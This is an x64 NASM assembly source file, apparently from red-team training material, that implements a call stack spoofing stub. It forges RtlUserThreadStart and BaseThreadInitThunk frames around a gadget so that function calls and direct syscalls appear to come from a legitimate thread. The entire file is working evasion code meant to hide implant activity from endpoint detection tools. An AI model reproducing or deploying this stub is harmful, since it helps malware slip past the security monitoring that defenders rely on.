; draugr.asm - Call stack spoofing stub
; Ported from CrystalKit / Crystal Palace (CRTL course)
; Build: nasm -f win64 draugr.asm -o draugr.obj
;
; Creates synthetic call frames mimicking a legitimate thread:
;   RtlUserThreadStart -> BaseThreadInitThunk -> gadget -> target function
;
; Called as:
;   draugr_stub(arg1, arg2, arg3, arg4,
;               &params, function, num_stack_args,
;               arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12)

default rel

section .text
global draugr_stub

draugr_stub:
    pop rax                         ; real return address

    mov r10, rdi                    ; save original rdi
    mov r11, rsi                    ; save original rsi

    mov rdi, [rsp + 0x20]           ; 5th arg: DRAUGR_PARAMETERS*
    mov rsi, [rsp + 0x28]           ; 6th arg: function to call

    ; save non-volatile registers into params struct
    mov [rdi + 24],  r10            ; params->Rdi
    mov [rdi + 88],  r11            ; params->Rsi
    mov [rdi + 96],  r12            ; params->R12
    mov [rdi + 104], r13            ; params->R13
    mov [rdi + 112], r14            ; params->R14
    mov [rdi + 120], r15            ; params->R15

    mov r12, rax                    ; keep real return addr in r12

    ; --- forward stack arguments to their final positions ---
    xor r11, r11                    ; counter = 0
    mov r13, [rsp + 0x30]           ; 7th arg: number of stack args to forward

    ; calculate destination offset (accounts for frames built later)
    mov r14, 0x200                  ; working space
    add r14, 8                      ; zero sentinel
    add r14, [rdi + 56]             ; RtlUserThreadStart stack size
    add r14, [rdi + 48]             ; trampoline stack size
    add r14, [rdi + 32]             ; BaseThreadInitThunk stack size
    sub r14, 0x20                   ; shadow space adjustment

    mov r10, rsp
    add r10, 0x30                   ; point to forwarded args on original stack

.loop:
    xor r15, r15
    cmp r11d, r13d
    je .done

    sub r14, 8
    mov r15, rsp
    sub r15, r14

    add r10, 8
    push qword [r10]
    pop qword [r15]

    add r11, 1
    jmp .loop

.done:
    ; --- build synthetic call stack ---

    ; 0x200-byte working space
    sub rsp, 0x200

    ; zero sentinel (terminates stack walk)
    push 0

    ; RtlUserThreadStart frame
    sub rsp, [rdi + 56]             ; allocate frame
    mov r11, [rdi + 64]             ; return address
    mov [rsp], r11

    ; BaseThreadInitThunk frame
    sub rsp, [rdi + 32]             ; allocate frame
    mov r11, [rdi + 40]             ; return address
    mov [rsp], r11

    ; gadget/trampoline frame
    sub rsp, [rdi + 48]             ; allocate frame
    mov r11, [rdi + 80]             ; trampoline (gadget address)
    mov [rsp], r11

    ; --- setup fixup for return path ---
    mov r11, rsi                    ; function to call
    mov [rdi + 8], r12              ; params->OriginalReturnAddress
    mov [rdi + 16], rbx             ; params->Rbx (save original)
    lea rbx, [.fixup]               ; fixup label address
    mov [rdi], rbx                  ; params->Fixup = &fixup
    mov rbx, rdi                    ; rbx = params (gadget: jmp [rbx] -> fixup)

    ; syscall support (r10=rcx, rax=SSN; harmless for non-syscalls)
    mov r10, rcx
    mov rax, [rdi + 72]             ; params->Ssn

    jmp r11                         ; call target function

.fixup:
    mov rcx, rbx                    ; rcx = params struct

    ; unwind synthetic frames
    add rsp, 0x200                  ; working space
    add rsp, [rbx + 48]             ; trampoline frame
    add rsp, [rbx + 32]             ; BaseThreadInitThunk frame
    add rsp, [rbx + 56]             ; RtlUserThreadStart frame

    ; restore original registers
    mov rbx, [rcx + 16]             ; Rbx
    mov rdi, [rcx + 24]             ; Rdi
    mov rsi, [rcx + 88]             ; Rsi
    mov r12, [rcx + 96]             ; R12
    mov r13, [rcx + 104]            ; R13
    mov r14, [rcx + 112]            ; R14
    mov r15, [rcx + 120]            ; R15

    push rax
    xor rax, rax
    pop rax                         ; preserve return value

    jmp qword [rcx + 8]             ; jump to original return address
